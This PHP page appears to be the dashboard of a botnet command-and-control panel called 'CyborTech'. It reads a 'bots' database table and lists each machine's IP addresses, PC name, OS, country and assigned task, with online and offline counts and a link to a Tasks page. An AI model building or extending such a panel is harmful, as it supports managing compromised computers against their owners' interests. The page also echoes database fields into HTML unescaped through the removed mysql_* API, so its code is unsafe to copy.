<?php
	session_start();
	require_once("user.cookies.php");
	$user_name = $_SESSION["SESS_USERNAME"]
?>

<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8"/>
		<title>CyborTech</title>
		<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />
		<link href="css/main.css" type="text/css" rel="stylesheet">
		<link href="css/dynatable.css" type="text/css" rel="stylesheet">
		
		<script src="scripts/jquery-1.7.2.min.js"></script>
		<script src="scripts/dynatable.js"></script>
		<!--[if lt IE 9]>
			<script src="scripts/html5shiv.js"></script>
		<![endif]-->
		<script type='text/javascript' src='scripts/respond.min.js'></script>
	</head>
	<body onload="$('#my-table').dynatable();">
		
		<div id="wrapper">
			
			<header>
				
				<h1>CyborTech</h1>
				
				<nav>
					<ul>
						<li class = "navli"><a href="dash.php" title="Home">Dashboard</a></li>
						<li class = "navli"><a href="task.php" title="About">Tasks</a></li>
						<li class = "navli"><a href="set.php" title="Work">Settings</a></li>
						<!-- use php to work out the login and logout script-->
						<li class = "navli"><a href="logout.php" title="Contact">Logout</a></li>
					</ul>
				</nav>
				
			</header>	
			
			<section id="main" >
				
				<?PHP
					
					include 'config/db.php';
					
					$sql = "SELECT * FROM `bots`";
					$query = mysql_query($sql);
					
					$bot_sum = mysql_num_rows($query);
					
					
					echo '
					<div class="main_info" id="onl"><h3 class="main_inf_txt">{} Online</h3></div>
					<div class="main_info" id="ofl"><h3 class="main_inf_txt">{} Offline</h3></div>
					<div class="main_info" id="ded"><h3 class="main_inf_txt">'. $bot_sum .' Total</h3></div>
					
					<!-- Bot Details-->
					<table id="my-table">
					<thead>
					<tr>
					<th class="tab_show ">UID</th>
					<th class="tab_hide ">Lan</th>
					<th class="tab_show ">Wan</th>
					<th class="tab_hide ">Name</th>
					<th class="tab_hide ">OS</th>
					<th class="tab_hide ">Flag</th>
					<th class="tab_hide ">Country</th>
					<th class="tab_hide ">Task</th>
					</tr>
					</thead>
					<tbody>		';		
					
					
					while ($row=mysql_fetch_array($query)){
						
						echo'
						
						<tr>
						<td class="tab_show ">'. $row['uid']. '</td>
						<td class="tab_hide ">'. $row['lan']. '</td>
						<td class="tab_show ">'. $row['wan']. '</td>
						<td class="tab_hide ">'. $row['pcname']. '</td>								
						<td class="tab_hide ">'. $row['os']. '</td>
						<td class="tab_hide "><img src="images/flags/'. $row['flag']. '.png" alt="Country" height="11" width="16"/></td>
						<td class="tab_hide ">'. $row['country']. '</td>
						<td class="tab_hide ">'. $row['taskn']. '</td>
						</tr>
						';
					}
				?>
				
			</tbody>
		</table>   
		
		<div id="cop">
			<h3>&copy;Cybortech.co.uk Author:M2K</h3>
		</div>
		
	</section>
</div>
</body>
</html>
